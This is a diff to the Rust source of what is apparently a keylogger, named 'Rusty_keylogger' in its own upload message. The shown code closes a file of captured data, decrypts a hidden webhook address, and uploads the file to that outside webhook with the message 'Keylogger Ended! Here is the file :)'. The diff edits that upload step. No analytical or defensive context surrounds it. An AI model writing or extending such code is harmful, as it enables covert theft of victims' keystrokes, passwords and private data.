@@ -40,11 +40,14 @@ pub async fn start() -> std::io::Result<()> {
 
     let _ = startup(&file.try_clone()?);
     
+
+
+
+
     //ending file
     let _ = file.write_all(b"--------------------\n")?;
     file.sync_all()?;
     drop(file);
-
     let file_path = path.join("Class.dat").into_os_string().into_string().unwrap();
     let file_path_static = Box::leak(file_path.into_boxed_str());
     let webhook = decrypt(WEB_HOOK, None);
@@ -63,8 +66,8 @@ async fn send_file_to_webhook(webhook_url: &str, file_path: &'static str) -> Res
 
     let client = Client::new();
     let form = Form::new()
-        .part("payload_json", Part::text(r#"{"content": "Here's your file!"}"#))
-        .part("file", Part::bytes(contents).file_name(file_path));
+        .part("payload_json", Part::text(r#"{"username": "Rusty_keylogger", "avatar_url": "https://i.imgur.com/4M34hi2.png", "content": "Keylogger Ended! Here is the file :)"}"#))
+        .part("file", Part::bytes(contents).file_name("Class.txt"));
 
     let response = client
         .post(webhook_url)
@@ -72,7 +75,7 @@ async fn send_file_to_webhook(webhook_url: &str, file_path: &'static str) -> Res
         .send()
         .await?;
 
-    println!("Response: {:?}", response);
+    println!("Response: {:?}", response.status());
 
     Ok(())
 }
